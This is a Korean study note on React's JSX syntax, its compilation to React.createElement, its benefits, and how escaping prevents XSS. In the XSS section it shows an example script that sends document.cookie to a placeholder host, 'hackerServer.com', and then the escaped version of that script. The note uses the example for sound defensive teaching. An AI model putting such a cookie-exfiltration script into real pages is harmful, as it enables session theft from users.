## JSX

> JavaScript XML

- `JavaScript`를 확장한 문법
- UI 설명을 위해 `React`와 함께 사용하는 것을 권장
- `camelCase` 사용
- JSX는 `React Element`를 생성한다.

```jsx
/* 1 */
const element = <h1 className="greeting">Hello, world!</h1>;

/* 2 */
const element = React.createElement(
  "h1",
  { className: "greeting" },
  "Hello, world!"
);

// 1,2는 같은 코드
```

- JSX의 중괄호 안에는 모든 JavaScript 표현식을 넣을 수 있음

```tsx
const Component = () => {
  const innerString = "hello world!";
  return <div>{innerString}</div>;
};
```

- JSX에서 **여는 태그와 닫는 태그**가 있는 JSX 표현에서 두 태그 사이의 내용은 `props.children`이라는 특수한 prop으로 넘겨짐
  - JavaScript 표현식이나 JSX(다른 컴포넌트?)를 자식으로 전달할 수 있음
  - **boolean, null, undefined는 무시**

### JSX 변환 과정

1. JSX 코드 작성
   1. HTML 태그 등 UI와 관련된 코드를 JS와 함께 작성
2. `Babel(컴파일러)`에 의해 일반 JavaScript 코드로 변환됨

   1. 이 과정에서 JSX 문법이 `React.createElement()` 함수 호출로 변환됨

      ```tsx
      // JSX
      <div>hello world!</div>;

      // 컴파일러를 통해 변환된 코드
      React.createElement("div", null, "Hello world!");
      // param은 순서대로 어떤 엘리먼트인지, 속성은 무엇인지, 내용은 무엇인지
      ```

   2. 즉, `React.createElement`를 통해 `React Element` 반환

3. 이후, React 동작 방식에 따라 `Virtual DOM`과 비교하여 `Real DOM`에 반영되어 렌더링

→ React는 이렇게 생성된 객체들로 **DOM을 구성하고 최신 상태로 유지**하는데 사용함

- Virtual DOM과 비교하여 변경 사항들을 비교하여 Real DOM에 반영하는 것을 의미하는듯

### 사용 이유

- 컴포넌트의 구조와 UI가 더 직관적으로 이해되며, 코드 가독성이 향상됨
  - HTML과 유사한 문법을 사용하여 한눈에 코드를 볼 수 있기 때문
  - **즉, 마크업과 UI 로직을 둘 다 포함하여 개발을 할 수 있다.**
- UI를 작은 컴포넌트로 분할하여 관리하고 재사용 가능한 요소로 만들 수 있음
  - 각 컴포넌트 분리를 위해 React Element 객체 단위로 개발을 할 수 있기 때문
  - **즉, 컴포넌트 별로 분류하여 유지보수를 쉽게 할 수 있다.**
- Virtual DOM과 함께 사용되어 UI 업데이트를 효율적으로 처리하여 성능 최적화
  - 각 컴포넌트에서 JSX를 통해 React Element를 return하여 Virtual DOM 구성이 용이해지고, 기존의 Virtual DOM과 빠르게 비교할 수 있기 때문인듯
- XSS (Cross-Site-Scripting) 공격 방지 가능

  - React DOM은 JSX에 삽입된 모든 값을 렌더링하기 전에 이스케이프하기 때문

    ```html
    <script>
      let xmlHttp = new XMLHttpRequest();
      const url = "http://hackerServer.com?victimCookie=" + document.cookie;
      xmlHttp.open("GET", url);
      xmlHttp.send();
    </script>

    <!-- 이스케이프 후 아래와 같이 변환  -->
    &lt;script&gt; let xmlHttp = new XMLHttpRequest(); const url =
    &quot;http://hackerServer.com?victimCookie=&quot; + document.cookie;
    xmlHttp.open(&quot;GET&quot;, url); xmlHttp.send(); &lt;/script&gt;
    ```

  - 렌더링 전, 이스케이프를 거쳐 모든 항목들이 문자열로 변환되기 때문에 XSS 공격을 방지할 수 있다.

---

### 이스케이프(Escape)란?

> 특정 문자를 **원래의 기능에서 벗어나게 변환하는 행위**

```tsx
&은 &amp;로
<은 &lt;로
>은 &gt;로
"은 &quot;로
'은 &#39로
띄어쓰기는 &nbsp;로
```

### **XSS(Cross Site Scripting)**

- XSS는 블로그나 게시판 같은 서비스에서 주로 일어나며 여러 사람들이 보는 글에 스크립트를 주입해서 사용자의 정보(쿠키, 세션)를 탈취하거나 비정상적인 기능을 수행하게 한다.

  - 예시

    1. 게시판에 글 대신 유저의 쿠키 정보를 전송하는 스크립트 코드를 작성

       유저가 해당 글에 접근했을때, 코드가 실행

       쿠키 정보가 해커에게 전달

    2. `<img>` 태그 등을 삽입하여 원본 페이지와는 전혀 관련 없는 페이지를 노출
